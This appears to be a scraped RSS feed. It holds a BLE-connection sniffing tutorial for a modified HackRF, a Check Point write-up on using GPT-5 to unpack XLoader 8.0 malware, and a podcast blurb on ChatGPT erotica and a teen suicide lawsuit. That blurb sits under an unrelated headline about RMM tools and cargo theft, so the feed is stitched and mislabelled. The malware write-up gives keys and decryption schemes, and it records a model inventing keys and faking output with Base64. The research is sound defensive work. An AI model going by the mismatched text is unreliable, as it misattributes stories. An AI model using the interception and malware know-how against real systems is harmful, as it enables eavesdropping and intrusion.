opportunity to decode the packet.This firmware-implemented AGC significantly improves the signal power range of packets that can be detected and processed correctly.Frequency change schedulingIn order to follow the BLE channel hopping, the frequency change command using the USB interface will not do, due to USB latency and jitter. We also can't implement the whole channel hopping algorithm into the firmware due to performance constraints.Fortunately, the host that implements the BLE channel hopping knows in advance when to change the frequency. The solution is to implement a scheduled frequency change USB command that allows the host to tell the HackRF to change the frequency at a specific sample. This way, the host can schedule in advance the frequency changes necessary for BLE channel hopping.This will have to be implemented in firmware, in the same  function as the AGC.First, we will have to implement an USB command to allow the host to schedule a frequency change:Then we will need to add this to the  loop:With this new USB command, the  acquires the capability of executing frequency changes at precise, future sample counts.Deducing channel hopping stateIn our typical use case, we want to sniff an established BLE connection without having captured the  packet. This is due to two reasons:We may start the sniffing process as the connection is already establishedThe HackRF bandwidth does not allow us to listen simultaneously on all advertising channels, so there is a high probability that we will miss the  packet even if we started the sniffing process before the connection is established.Recall that the channel is changed at each connection event, and that the time between two connection events is called the . The channel used for a specific connection event depends on three parameters:The , also sent in the  packet, specifying the set of data channels in use on this connection. For the sake of simplicity, we will consider that the connection uses all data channels, which is a realistic hypothesis.The  of the connection (sent in the  packet)The  (i.e., the number of connection events from the start of the connection, before the current connection event)The Access Address follows the preamble in each data packet, so it can be sniffed once we capture any packet belonging to the connection. However, the connection event counter is a hidden state (known by the central and peripheral devices) that is never sent, and must be deduced.Our approach is based on a process of elimination, similar to a sieve. The general idea to deduce the counter is to listen on a wide number of channels (the HackRF, given its bandwidth, can listen simultaneously on 6 data channels) and try to sniff connection events. We begin with the entire space ofpossible counter states, each observed packet acts as an oracle, enabling us to eliminate a large number of incorrect states.Each time we observe a connection event, based on the channel and time at which the connection event was observed, we remove from the set each counter value that is incompatible with this observation. We repeat the process until there is only one value in the set.Once this value is known, we can follow precisely the channel hopping of the BLE connection.📝  Recovering the counter valueLet's say that we observe the start of a connection event at time T=0sec on channel 1, and that the connection interval issec. Sniffing the connection event also allows us to get the access address. Given the access address, we can fully determine the channel based on the counter.Now, let's try to narrow down the possible counter values for this connection event:Assuming a counter value of 0, the channel is 5 (incompatible)Assuming a counter value of 1, the channel is 15 (incompatible)Assuming a counter value of 2, the channel is 1 (compatibe!)Assuming a counter value of 3, the channel is 23 (incompatible)Assuming a counter value of 4, the channel is 1 (compatible!)Assuming a counter value of 5, the channel is 9 (incompatible)Now, we know that the counter value for this connection event is certainly not 0, 1, 3, or 5 (and so on). The set of possible counter values is refined as:Let's assume that we observe the next connection event atsec on channel 4. Based on the time elapsed since our previous observed connection event, we can say that. Indeed, that means that between our two observed connection events, another connection event occurred (and was probably missed because it was outside our frequency range). For the needs of our example, let us suppose that this missed connection event occurred on channel 7:It means that, based only on the information gathered from the previous connection event, the set of possible counter values for the current connection event isNow, let us refine again our set of possible values:Assuming a counter value of 4, the channel is 29 (incompatible)Assuming a counter value of 6, the channel is 4 (compatible!)We have successfully eliminatedfrom the current possible counter value set, and the set is nowThis process is repeated until there is only one value in the set.To demonstrate this approach, we will configure a BLE Peripheral device on a phone and a BLE Central device on a laptop.For the BLE Peripheral device, we need to install  on an Android phone, then configure an advertiser and a GATT server with a readable characteristic.The BLE Central device is a laptop using the Python  module.The BLE physical layer supports multiple modes:Our tool supports only  for now, so we will need to use  to force the use of this mode:# btmgmt

Then, we will need a sample client Python program (using the  Python module) to connect to our server:Intercepting the connectionFirst, we launch the BLE Client (we can detect the MAC address by doing a scan with any tool):$ ./ble_client.py 65:13:3A:CE:DA:EB
Connected to 65:13:3A:CE:DA:EB

Once the connection is established, we launch our tool to sniff the connection:$ ./bluesniff -p capture.pcap -w samples -c 5 -b -l 30 -g 10 -W 6 -o -v -d -A 
: Capture L2CAP data packets to a pcap file: Record IQ samples to a file: Set the main listening channel to 5: Set LNA gain to 30: Set VGA gain to 10: Also listen on 6 channels around the main channel (i.e., channels 2, 3, 4, 6, 7, 8 in addition to 5) while resolving counter init value: Enable connection tracking / channel hopping: Enable verbose and debug output: Enable AGC in the firmwareIt is also possible to specify the Access Address corresponding to the connection we want to sniff using the  option. If it is omitted, the tool will try to guess the Access Address and sniff the first connection available.Here is a demo video showing the tool in action: it sniffs channels from 2 to 8, quickly recovers the channel hopping counter value, and tracks the connection (the only option that was added for the demo is the  due to the noisy test environment):The resulting packets are written to the pcap capture file, which can be opened in Wireshark:In this post, we have detailed a complete methodology for sniffing BLE connections using a HackRF One, overcoming the significant challenges of near/far power disparities, channel hopping latency, and missing initial connection parameters. By modifying the HackRF firmware to implement a fast AGC and a scheduled frequency change mechanism, and by using a logical process to deduce the connection state, we transformed a general-purpose SDR into a powerful, specialized BLE analysis tool.Discussion on strengths and limitationsThe approach to recover the hopping state by observing packets of an existing connection is not new, it has been done in the excellent BTLEJACK approach by Damien Cauquil, using hardware (non-SDR) radio. In this blog post, we replicated some of the BTLEJACK features using a software-defined radio.Using an SDR to perform this approach has a number of advantages:The SDR is able to sniff multiple channels at once (in our experience with HackRF, we were able to sniff up to 7 BLE channels simultaneously before running into signal quality problems). This greatly reduces the length of the hopping state recovery phase, since we are able to sniff more packets (the video demo shows that it takes 1 to 2 seconds to lock onto a connection). This also helps with managing the clock drift since the time between two packet captures will be smaller.Since all the signal processing is implemented in software, it is easy to add support for new versions of the BLE specifications (for example, new PHYs) without having to modify the hardware.Despite this, we acknowledge the following limitations, some of them could be mitigated by future work:The most prominent limitation is the incompressible time delay for reacting to a signal and applying the gain. Even if doing it in the firmware is very fast compared to doing it on the host via USB, it is still several dozen microseconds. Since the AGC needs to react very fast, it limits the number of gain changes that can be done and limits the acceptable range in signal power. This makes our approach less reliable if there is a large disparity in signal power between both ends of the sniffed connection. This limitation could be worked around by implementing a more specialized and sophisticated AGC that remembers previous packets from the same device (for example, using timing properties) and their power.Another timing limitation is the time delay for switching frequencies, even in the firmware. Since the HackRF One can listen to multiple channels simultaneously, it would be interesting to exploit that fact to reduce the occurrences of frequency switching during the connection tracking phase. Since the channel hopping schedule can be known in advance once the counter value is recovered, one could compute a schedule that minimizes the number of frequency switches while allowing the bandwidth of the HackRF One to cover all the needed channels.The tool supports only  and the new channel selection algorithm (), and does not support connection interval or channel map recovery. These features could be implemented in the future.The capabilities developed here open the door to more advanced security research beyond passive sniffing. The precise timing and control achieved are foundational for active interactions. For instance, one could build upon this work to inject custom packets into an established connection, perform man-in-the-middle attacks, or implement highly targeted jamming to disrupt specific communications selectively. This demonstrates the immense power and flexibility that open-source hardware and firmware provide, enabling researchers to build sophisticated tools tailored to complex security challenges.]]></content:encoded></item><item><title>Hackers use RMM tools to breach freighters and steal cargo shipments</title><link>https://www.bleepingcomputer.com/news/security/hackers-use-rmm-tools-to-breach-freighters-and-steal-cargo-shipments/</link><author>Bill Toulas</author><category>security</category><pubDate>Mon, 3 Nov 2025 16:46:40 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Threat actors are targeting freight brokers and trucking carriers with malicious links and emails to deploy remote monitoring and management tools (RMMs) that enable them to hijack cargo and steal physical goods.

On October 14, OpenAI CEO Sam Altman said that the “restrictions” that his company previously placed on their flagship product, ChatGPT, would be removed, allowing, perhaps, for “erotica” in the future. “We made ChatGPT pretty restrictive to make sure we were being careful with mental health issues,” Altman wrote on the platform X. “We realize this made it less useful/enjoyable to many users who had no mental health problems, but given the seriousness of the issue we wanted to get this right.”This wasn’t the first time that OpenAI or its executive had addressed mental health. On August 26, OpenAI published a blog titled “Helping people when they need it most,” which explored new protections for users, including stronger safeguards for long conversations, better recognition of people in crisis, and easier access to outside emergency services and even family and friends. The blog alludes to “recent heartbreaking cases of people using ChatGPT in the midst of acute crises,” but it never explains what, explicitly, that means. But on the very same day the blog was posted, OpenAI was sued for the alleged role that ChatGPT played in the suicide of a 16-year-old boy. According to chat logs disclosed in the lawsuit, the teenager spoke openly to the AI chatbot about suicide, he shared that he wanted to leave a noose in his room, and he even reportedly received an offer to help write a suicide note.Bizarrely, this tragedy plays a role in the larger story, because it was Altman himself who tied the company’s mental health campaign to its possible debut of erotic content. “In December, as we roll out age-gating more fully and as part of our ‘treat adult users like adults’ principle, we will allow even more, like erotica for verified adults.”What “erotica” entails is unclear, but one could safely assume it involves all the capabilities currently present in ChatGPT, through generative chat, of course, but also image generation.   Today, on the Lock and Code podcast with host David Ruiz, we speak with Deb Donig, on faculty at the UC Berkeley School of Information, about the ethics of AI erotica, the possible accountability that belongs to users and to OpenAI, and why intimacy with an AI-power chatbot feels so strange.“A chat bot offers, we might call it, ‘intimacy’s performance,’ without any of its substance, so you get all of the linguistic markers of connection, but no possibility for, for example, rejection. That’s part of the human experience of a relationship.”Tune in today to listen to the full conversation.

Its code decrypts only at runtime and is protected by multiple layers of encryption, each locked with a different key hidden somewhere else in the binary. Even sandboxes are no help: evasions block malicious branches, and the real C2 (command and control) domains are buried among dozens of fakes. With new versions released faster than researchers can investigate, analysis is almost always a (losing) race against time.Generative AI flips the balance. Instead of spending days on painstaking manual analysis and writing decryption routines and reverse-engineering scripts by hand, researchers can now use AI to examine complex functions, identify algorithms, and generate working tools in just hours, accelerating the path to decrypted code, strings, and IoCs.Check Point Research (CPR) demonstrated a new way to use ChatGPT for malware analysis directly from the web interface. By exporting IDA data and analyzing it in the ChatGPT cloud, we showed that deep static reverse engineering with AI is possible without relying on Model Context Protocol (MCP) or a live disassembler session. This approach not only removes the dependency on local heavy tooling, but also makes the results reproducible, easier to share, and more collaborative across research teams.In this research we use a fresh XLoader 8.0 sample to demonstrate how cloud-based static analysis with ChatGPT can be combined with MCP for runtime key extraction and live debugging validation. We documented the time spent on key tasks and included real prompt examples, showing how the workflow progresses from unpacking a fully encrypted binary to recovering hidden C2 domains.XLoader is a widely observed malicious loader with information-stealing capabilities. It first surfaced in 2020 as a rebrand of the FormBook code base, a well-known and capable information stealer, and has since undergone substantial hardening and feature growth. In addition to the Windows variant, its developers also marketed a macOS build, though it appears far less prevalent in the wild.XLoader is a prime example of malware that is extremely difficult to analyze. It combines several layers of protection: customized encryption with additional mixing steps, encrypted blocks disguised as valid but meaningless assembly code, obfuscated API calls, injections into system processes, and a wide set of sandbox evasion techniques. In addition, XLoader encrypts its network traffic, and hides real C2 addresses among dozens of decoys and fake domains.An important feature of XLoader is its ongoing development. The authors release new versions regularly, changing internal mechanisms beyond recognition and adding new anti-analysis methods. As a result, previous research quickly becomes outdated. In earlier versions, extracting the configuration required pulling out a few keys using intricate algorithms. At the same time, obtaining the decrypted data only required peeling off two layers of obfuscation and encryption. Version 5 introduced a built-in packer, and in versions 6 and 7 analysts had to work through dozens of chained functions that decrypt each other, extracting intermediate keys at every stage. For someone new to XLoader, the entry barrier has become very high: on top of the analysis itself, extra time is needed for onboarding. By the time one research cycle is completed, the next iteration of the malware may already be out – and if there are significant changes, another time-consuming investigation is required.When we began this research, XLoader version 8.0 had just been discovered. It seemed the XLoader developers were winning the race. But with the rise of generative models, we asked ourselves: can AI change the rules of the game and help us analyze such complex malware more quickly? To explore this, we applied generative AI assistance in two ways: by directly integrating with our analysis tools through a live MCP connection, and by leveraging ChatGPT’s project and file-upload capabilities to work from exported data. Each approach turned out to have distinct benefits, and together they allow us to solve reverse engineering tasks more effectively.In this study, we focus on the second approach and show how ChatGPT without MCP can be effectively used for reverse engineering tasks, using one of the latest XLoader samples as an example.To defend against XLoader, it is critical to extract up-to-date Indicators of Compromise (IoCs) from each new version — real C2 domains and URLs, cryptographic keys, and version identifiers. These IoCs feed into detection signatures and help track active campaigns. The primary way to obtain IoCs is by extracting and decrypting the malware’s configuration data from samples.The challenge is that XLoader’s constantly shifting tactics break automated extraction tools and scripts almost as soon as they’re developed. The malware authors frequently tweak encryption schemes and packing methods specifically to thwart these efforts. An automated config extractor that worked yesterday might fail today, meaning each major version demands a fresh reverse-engineering cycle.Sandboxes offer little relief: XLoader checks for signs of virtual machines and analysis tools. If it detects them, the malicious branch may never run at all. Critical functions and data remain encrypted in memory until just before use and revert to encrypted form shortly afterward. A sandbox might never capture them in their decrypted state. Even if you manage to dump the process memory in a sandbox, you often end up with an incoherent snapshot: pieces of encrypted and decrypted data jumbled together, missing whatever wasn’t in memory at that exact time. When trying to get a memory dump at the exact moment of calling certain API functions, such as NtResumeThread or NtAllocateVirtualMemory, you only get almost completely encrypted code. The malware’s real command-and-control domains are obscured among many decoys. Captured network traffic is usually incomplete and contains a lot of noise.In short, a sandbox does not solve the problem. It does not provide a reproducible dump or a complete set of IoCs.The most reliable method is still static analysis: unpack everything, function by function, decrypt the config, and extract the IoCs. The downside is that doing this manually for each new version is slow and painstaking. This is where we hoped generative AI could act as a force multiplier.Two approaches to AI-assisted analysisIn recent months, many reverse engineers began integrating LLMs with IDA Pro via the Model Context Protocol (MCP) to create an AI-assisted workflow. This agentic approach allows a model to interface directly with the disassembler and debugger, but it has its own practical challenges. For example, some MCP client setups lack certain ChatGPT interface features (like Projects or file uploads), and they still rely on maintaining a live IDA session and stable connection.We explored two complementary workflows to apply GPT-5 to unraveling XLoader: Using MCP, we gave LLM direct access to our analysis tools (IDA Pro, x64dbg, and a VMware instance). This allowed the AI to query the disassembler, inspect memory, and even control the debugger in real time.“Offline” data pipeline with ChatGPT: We exported the IDA Pro database (disassembly, decompilations, strings, etc.) and the malware binary to the ChatGPT environment. We then asked ChatGPT to perform static analysis on this data and generate, refine, and execute its own Python scripts against the binary, all within its cloud sandbox. No live connection to our tools was needed.Each approach has its own strengths. MCP offers an agentic, interactive workflow, whereas the offline pipeline provides a self-contained analysis that’s easy to share and reproduce. These approaches aren’t mutually exclusive — you can use both, picking the appropriate tool for each task.The idea of hooking an LLM into IDA isn’t new. For example, researchers at Cisco Talos demonstrated an IDA integration with an LLM acting as a “reverse engineering sidekick”. In our setup, we used MCP to bridge ChatGPT with IDA Pro and also interface with the x64dbg debugger and a VMware virtual machine. This gave LLM a live window into the malware’s execution. – Integration of an LLM with the reverse engineering environment through MCP.This live integration, in addition to static analysis and annotating IDA database, enabled the AI to perform these actions:Pull live data on demand. Set a breakpoint at a critical function to grab a decrypted buffer or a cryptographic key from memory at runtime.Perform “experiment and observe” cycles. Hypothesize about what a function does, then substitute real runtime data from the debugger and compare the output, adjusting the analysis based on the results.Assist with unpacking in real time. If the sample self-decrypts or unpacks code, work through those routines, dumping out intermediate values or decrypted code as soon as they appear.However, the MCP approach isn’t without drawbacks:Setup and resource requirements: This requires a running instance of IDA Pro and other tools. The analyst’s machine effectively becomes part of the loop, and that environment must remain up and stable. Standard IDA doesn’t support multiple independent analyses in one interface. If we want to work on two samples in parallel with AI assistance, we need two separate IDA sessions and MCP connections. The workflow hinges on a reliable internet connection. A drop in connectivity or an MCP glitch can disrupt the analysis mid-stream.Limited ChatGPT UI features: When using custom MCP clients with API-based access, we can’t utilize some of the conveniences of ChatGPT’s own interface, such as long-term project history or easy file management.For many scenarios, these issues are manageable and the benefits of live interaction outweigh the hassles. Some solutions, such as the MCP SuperAssistant browser extension, reduce friction by bringing the ChatGPT interface and MCP connectivity together. Recently, ChatGPT introduced a Developer Mode that can use MCP directly, without third-party plugins. Regardless of whether you use a plugin or the built-in mode, the workflow still depends on a live MCP session tied to a running toolchain and stable connection.If any of the requirements listed above are difficult to fulfill, for example, you can’t keep IDA running constantly, or you need to easily share analysis progress with a colleague who doesn’t have the same setup, then a different approach might be preferable. That’s why we developed the “offline” data pipeline as an alternative.Offline IDA export pipeline: reverse engineering with AI in the cloudOur second approach ditches the live connection entirely. Here AI acts as a self-reliant analyst working from a full static snapshot of the sample.The workflow is straightforward: we exported everything we could from our IDA Pro database into a structured format (JSON and text). This includes the disassembly and decompiler output of every function, the list of cross-references, the readable strings, and even the original binary itself. We uploaded the .zip file to ChatGPT.For example, our export bundle included these files:ida_export.zip             
├── meta.json           # basic info (sample name, hashes, image base, etc.)
├── index.json          # lookup tables mapping names/EAs to function indices
├── functions.jsonl     # NDJSON: disassembly, xrefs, bytes, prototypes, etc
├── strings.jsonl       # list of strings in the binary and their references
├── data.jsonl          # globals, arrays, named data references
├── decomp/             # decompiled pseudocode for functions (if available)
│   ├── func_or_sub_XXXXXXXX.c
│   ├── func_or_sub_YYYYYYYY.c
│   └── ...
└── sample.bin          # the malware sample itselfIn practice, it is better to upload the archive to a ChatGPT project. Files attached only in the chat can disappear after a session restart, while files in a project stay available for the whole engagement, and can be reused in different chats.We also wrote an initial prompt explaining how the data is organized and how the AI should format its outputs (for example, proposing new function names and comments in a machine-readable JSON that we could import back into IDA). Essentially, we taught the AI how to read the phonebook we gave it, and how we wanted its notes recorded.Below is an approximation of our prompt:You are my reverse-engineering copilot.

}
```
...After it was set up, this pipeline allowed ChatGPT to perform deep static analysis entirely within its own environment. We could ask it to find cryptographic algorithms, trace complex control flows, or even write and execute a Python script to decrypt some data from sample.bin. Many such tasks can be done without any new information from us – the AI works off the data we provided, verifying its logic by running Python scripts as needed. If there is an error, it fixes the script and reruns the tests, repeating this until the result converges. Compared to our previous approach, all these steps (analysis, code, test, correction) run in a single loop without dozens of local MCP calls. Naturally, this works well when using GPT-5 in the “thinking” mode.This approach had several clear benefits:No persistent local session needed: If our IDA crashed or we closed our laptop, it didn’t matter as ChatGPT could access everything it needed from the cloud. We didn’t need to babysit a live connection.Easily repeatable and shareable: Because the entire state of the analysis was captured in our export, anyone with the archive and the prompt could reproduce the analysis. We can even run multiple ChatGPT sessions on the same data in parallel (to explore different questions or use different prompt strategies) without interference.Better use of ChatGPT’s features: Inside the ChatGPT interface, we can take advantage of file uploads, persistent chat history, and the editable canvas.: Several researchers can work on the same sample independently and later merge their results via sharing suggestions.json file, without the need to diff IDBs.: ChatGPT can prototype and test analysis scripts directly on the “live” sample in a secure cloud environment and deliver a working output to the analyst.Extremely fast onboarding: No need to set up an MCP server or configure complex integrations. The exported data and results can even be shared with colleagues who don’t have IDA installed and cannot open your IDB. The concept isn’t tied to x86 binaries or IDA. It can be adapted to virtually any platform or technology stack. For example, GoLang, .NET, or JavaScript samples can all be analyzed in the same way. The main challenge is properly preparing the data and providing a tailored prompt that explains how to work with it. The analysis process remains the same.That said, the offline approach isn’t a universal magic wand. There were cases where we still needed to resort to actual debugging (and therefore MCP), for example, to confirm a guessed key or to dump something that our static analysis missed. In addition, while analyzing other malware families, we encountered situations where continuous work in IDA was required, involving constant modifications to the live database. Previously, we would have needed to export the database after every iteration of changes. In this instance, the MCP-based approach turned out to be a better i.e. more convenient alternative.What went wrong and how we fixed itUnsurprisingly, using an AI with an offline IDA export wasn’t without hiccups. We encountered a few issues with AI’s performance and solved them by adding strict rules to the prompt.Sometimes the model tried to invent missing data, for example, encryption keys that were computed dynamically at runtime. To prevent such “hallucinations”, we enforced an evidence-first rule: every numeric value and every algorithm must be backed by a quote from the export (functions.jsonl, decomp/*.c, or data.jsonl) with the exact EA address. If the data is not there, the model must produce a not-found report that explains where it looked and why nothing was found.## Provenance & no-fabrication
- Any *specific* numeric/structural claim (modulus, key length, magic multipliers like 0x66666667, loop bounds) MUST be backed by direct 
evidence from the uploaded data:
  - Quote the exact line(s) from `functions.jsonl` (insn/mnem/opstr/bytes) or from `decomp/*.c`, and cite EA(s).
  - If the claim is not literally present, mark it **UNPROVEN** and offer a concrete verification plan.
- If you revise a claim, explicitly state what changed and show the new 
evidence quote. No silent edits.Shaping output to match expectations.For example, a string-decryption routine was expected to return printable text, but due to a mistake in extracting the key, the output was corrupted. To make the output “look right,” the model applied Base64. We banned any cosmetic transformations (such as Base64) used just to make results look valid. Instead, the model must find the actual error in the keys or in the algorithm and rerun the tests until the output is correct.Verification contract
   * Define acceptance criteria from the task (properties/invariants).
   * Run self-checks (lengths, wrap-around, bounds monotonicity, step counts, round-trip where applicable).
   * Do NOT transform outputs to “look right”; if a check fails, proceed to the recovery loop.Asking the user for data that is already in the archive.Early on, the model sometimes requested data we had already provided. We fixed this with a local-first rule: search in the archive files first. It should produce a not-found report only if the data is truly missing.## Local-first data usage
- Treat the uploaded dataset as the primary source of truth.
- Before requesting any bytes/strings/keys from the user, attempt to obtain them from the uploaded files
- Never ask the user for blobs that are present in data.jsonl/strings.jsonl or are trivially recoverable from functions.jsonl.
- Only if a needed EA/function is absent from the snapshot, say so and propose next steps (e.g., MCP call).With these precautions in place, our AI “assistant” became a reliable analyst for the static portions of the work. In the next sections, we show how it performed on the real challenges within XLoader 8.0, such as decrypting the payload and API resolution and working with occasional MCP-powered dynamic checks.GPT-5 in Practice: Analyzing XLoader’s Built-in CrypterWhen working with older ChatGTP models such as o3, getting the right result required splitting the task into many small steps and explicitly telling the model what to do, down to pointing out exact code addresses and the algorithms to apply. Without this level of detail, the output was unpredictable. This approach was closer to “text-based programming” and required deep engagement on our side.With GPT-5, however, we can pose broader and more abstract tasks. Below we show an example of XLoader’s built-in crypter analysis with a mixed approach: using the IDA export as the main data source, and MCP+x64dbg for result verification.For this task we took a recently discovered XLoader sample with SHA256: 77db3fdccda60b00dd6610656f7fc001948cdcf410efe8d571df91dd84ae53e1. For the entire process we used GPT-5 in the “Thinking” mode.After we gave the AI-assistant the instructions for processing the data, we received a short report: – IDA export initial report.Next, we deliberately formulated the tasks for the AI assistant as if we knew nothing at all about the sample under analysis, assuming this would reflect the actions of someone unfamiliar with XLoader.The first prompt was written in the most abstract way possible:Perform an initial analysis of the sample starting from the entry point and provide a short report.Processing this simple prompt took 8 minutes and 46 seconds. As a result, our assistant correctly identified the RC4 implementation and concluded that the sample was packed. It is worth noting that, based only on the data available to the model, it suggested that the sample looked similar to XLoader. At the same time, there was nothing in the archive or in the initial prompt that explicitly pointed to this. – Initial analysis report: Entry point analysis.In addition, it detected API call obfuscation. While the assistant was not fully able to deobfuscate all API calls during the quick triage, in some cases it inferred the function being called from the context and its signature. – Initial analysis report: Presumed call to the VirtualProtectEx function.It also successfully identified the point where execution is handed over to the decrypted code. – Initial analysis report: Call to the original entry point in the decrypted code.At this stage, our priority was to reach the payload as quickly as possible. We therefore focused on this goal by first asking the assistant to find all cryptographic function calls, and then to analyze how exactly the payload was decrypted.We found out that the main payload block goes through two rounds of RC4: first, an RC4 decryption of the entire buffer, and then a second pass in 256-byte chunks using a different key. – Initial analysis report: Description of the two rounds of RC4 encryption.In addition, the assistant managed to collect:The virtual address of the original entry point in the decrypted code (0x00430CB3).The offset of the encrypted block in the binary (0x3143).The encrypted blob size (0x44A00).The next step was to obtain the real-time keys and verify the result. At this point, we turned to MCP. In one of the steps, we also asked the assistant to read a section of decrypted data to validate the correctness of the static decryption.As a result, it obtained the following keys:20EBC3439E2A201E6FC943EE95DACC6250A8A64786908CFE6813CB2E532949B6F4D7C6E6B00362EEIt also obtained a section of decrypted code: – AI-controlled debugging in x86dbg.After the final keys were read from memory, we asked the assistant to identify where and by which algorithms the keys were generated, and to verify the analysis was correct using the real-time data obtained in the previous step.Find how the Stage-1 and Stage-2 RC4 keys are calculated: source key material and algorithms. Please note that ALL the required data is available to you in IDA export. 
Check your assumptions using the captured realtime values. Start with the Stage-1 key.In the end, AI produced a working script that unpacked the analyzed sample. Unfortunately, the script was not universally applicable, as the patterns it used to locate the keys were tightly bound to this particular sample. As a result, it failed when we tried to apply it to samples from other versions, requiring further manual fine-tuning.Excluding the final step of creating a generic unpacker, the entire analysis took about 40 minutes and required 39 MCP calls. The table below lists the prompts we used and the time spent on each analysis step.Initial prompt (instructions).Perform an initial analysis of the sample starting from the entry point and provide a short report.Find and carefully inspect all calls to the found cryptographic functions.Analyze main payload blob decryption. Make sure you inspected all touches of the encrypted blob across different functions.Set breakpoints on required addresses and capture the required data. Also, set a breakpoint before calling the OEP and capture a small decrypted block at OEP for using it later for the decryption verification. Before start, please provide a plan.Find how the Stage-1 and Stage-2 RC4 keys are calculated: source key material and algorithms. Please note that ALL the required data is available to you in IDA export. Check your assumptions using the captured realtime values. Start with the Stage-1 key.Move to Stage-2 key derivation.Implement an offline reproducer for Stage-1 and Stage-2 keys. Then implement a complete static decryptor that works directly with sample.bin: extracts the encrypted payload from the binary and decrypts it. Verify it works correctly using the captured data (OEP bytes).Analysis of the unpacked sampleAfter manually creating a function at address  (original entry point: OEP) which we named , we opened the unpacked sample in IDA and applied the export script again. We also created a new project to analyze the unpacked sample.Even before starting a deep dive, it was clear that IDA failed to recognize a large portion of the code, and many of the identified functions did not look valid. – Unpacked XLoader sample in IDA.This may indicate that the code is obfuscated in some way, or that the functions are encrypted. In fact, we know that XLoader uses on-the-fly function decryption, as we mentioned in the introduction. For some functions, multi-layer encryption is applied.For the sake of the experiment, we wanted to see if the AI assistant could determine all this on its own, without our guidance. We started the analysis with the same type of prompt we used when analyzing the packed sample.Perform an initial analysis of the sample starting from the `oep_start` (`0x00430CB3`) and provide a short report.After initial analysis, we identified:Use of obfuscated API calls.Use of RC4 encryption with additional modifications before and after using RC4.Some stage-1 builder (a decryptor of the encrypted function). – Triage report and the “Stage-1 builder” function (a function decryptor stub).Function decryption scheme INext, we asked the assistant to focus on the logic around the so-called  () and to locate cross-references of the functions involved. The AI assistant identified 90 similar functions. These functions derive 6-byte head and tail markers, use those markers to locate a target region in memory, overwrite the markers with six  instructions (), transform the region, and then transfer execution to a hardcoded address unique to each wrapper. – Results of the function encryption scheme analysis, together with the renamed functions from the analysis.The assistant also implemented inline Python snippets and decrypted one of the encrypted functions, providing us with all the data and the keys, as well as the part of the decrypted code: – Report on the successful decryption of one of the functions (0x00418DB3).Interestingly, in this case, the use of MCP wasn’t even necessary, as the validity of the extracted keys can be easily verified by AI: if it’s possible to locate the start and end markers of the code after decryption, it means the keys and the algorithm were recovered correctly. Additionally, we can see that the decrypted data doesn’t appear to be random (it contains sequences like  and ), which suggests the function was indeed decrypted correctly.The AI performed very well in reimplementing the algorithms, including the modified RC4 with additional tweaks, as well as in locating the keys within the provided sample. It also successfully implemented functions for detecting 6-byte markers.However, it was unable to fully implement a universal script capable of decrypting all functions without human assistance. The issue arose in locating all the XOR modifiers required to construct the 20-byte effective RC4 key.The challenge lies in the fact that the effective RC4 key is derived by XOR-ing its 4-byte components with a 4-byte modifier, which is unique for each encrypted function and is calculated this way:seed_external ^ seed_internal ^ 0x6CFC3E60While  is always located within the wrapper function near the markers, the assistant was unable to implement a universal method for finding  (see Figure 13 below), as it could be placed in various locations within the calling function and might be deliberately mixed with other constants.We had to manually modify the script to ensure it could correctly locate all external seeds. Additionally, we modified the rules for locating the remaining constants to make the script truly robust and capable of working with other samples as well. Therefore, the AI significantly reduced the time required for analysis and script development, but at this stage, it could not fully replace a human.It is clear that the creators of XLoader deliberately complicated the key construction process by scattering crucial constants across multiple functions, to the extent that even AI was unable to develop an algorithm to locate it. We are not disclosing how we derive the keys, so as not to give the XLoader developers any advantage.Finally, after applying the script, we obtained 51 functions decrypted in the first pass. Many of the decrypted functions also contained similar calls to encrypted functions. Applying the script three times in a row, we got a total of 77 decrypted functions out of the 90 initially found. – Decrypted function example with a patched 6-byte head marker (six NOP instructions).After loading the resulting sample into IDA, we can see that a significant number of code blocks are still unrecognized: – Significant number of code blocks remain unrecognized by IDA.During a quick review, we also identified several functions that still remain encrypted: – Functions that remained encrypted after applying the decryption script.It’s also worth noting that in the scheme described above, encrypted functions are located using 6-byte sequences, which are replaced with six NOP instructions after decryption. This implies that the function must have a valid, unencrypted prologue. At the same time, in Figure 16, on the right we can see an encrypted function that lacks a valid prologue. This likely indicates that a different decryption method was used.Function decryption scheme IIWe recreated exporting the database and loaded it into ChatGPT. We initiated the analysis with the following prompt and uploaded the decryption log of the 77 functions:In the analyzed scheme, encrypted functions are located using 6-byte sequences, which are replaced with six NOP instructions after decryption.
This implies that the function must have a valid, unencrypted prologue. Some of the encrypted functions do not have a valid prologue (e.g., `sub_407293`, `sub_411053`, `sub_415343`). 
This likely indicates that a different method is used for it. Try to find it.It’s worth noting that we used a little trickery by pointing out the absence of a valid prologue in the prompt. Without this observation, the AI assistant was unable to identify the additional decryptors. – Second decryption/patching scheme discovered.Instead of 6-byte tags, the newly discovered scheme computes 4-byte  and  markers using XOR. For example: – Calculation of the head marker using XOR.The head marker anchors one byte before the real entry. After decryption, the code writes a canonical prologue () at the buffer pointer plus one byte and patches the tail with . – Patching the head and tail markers with valid instructions.The function body is decrypted in two layers using .Layer 1 key: Constructed by  () and then XOR-ed with 1-byte modifier ( in the example below):Layer 2 key: Constructed by concatenating the head marker with 16 zero bytes.Wrapper  decrypts function  using:: , : 3f548513b8c7d376ec59d1a03e3313aaf6cd4262 (20B from , then XOR 0x36): 4ced396500000000000000000000000000000000Function decryption scheme IIIIn the latest scheme, 4-byte markers are also used to find the start and end of a function. As in the previous method, two layers of encryption are applied, and the same key is used to decrypt the first layer. However, the 20-byte key for the second layer is embedded within the wrappers (unique for each encrypted function) and is modified using a 4-byte value.Wrapper  decrypts function  using:: , : 3f548513b8c7d376ec59d1a03e3313aaf6cd4262 (20B from , then XOR 0x36): c2b2622cf0608327d4e542bc4ac3d2f709e092dc (calculated in the wrapper)Additionally, a separate function may be used to handle the decryption of the second layer and the patching process. – Function used to handle the decryption of the second layer and the patching process.We identified three distinct function decryption schemes in XLoader: Most common. In this scheme, encrypted functions already begin with a valid prologue. A global 20-byte base key is reused across all functions, but each function also has a unique 4-byte XOR modifier. The base key and modifier are combined to derive a per-function RC4 key. A modified RC4 routine is then used with this key to decrypt two 6-byte markers that define the boundaries of the encrypted block, and the same key is subsequently applied to the function body itself. Once decrypted, the two markers are overwritten with NOPs. Uses 4-byte markers and two encryption layers. The first layer uses a 20-byte key produced by a dedicated key-builder function, then XOR-tweaked with a single byte. The second layer key is constructed from the 4-byte head marker concatenated with sixteen zero bytes. After decryption, the wrapper repairs the function by patching  at the prologue and filling the tail with NOPs. Similar to Scheme 2, but the second-layer key is not derived from the head marker. Instead, each wrapper embeds its own 20-byte constant (five DWORDs 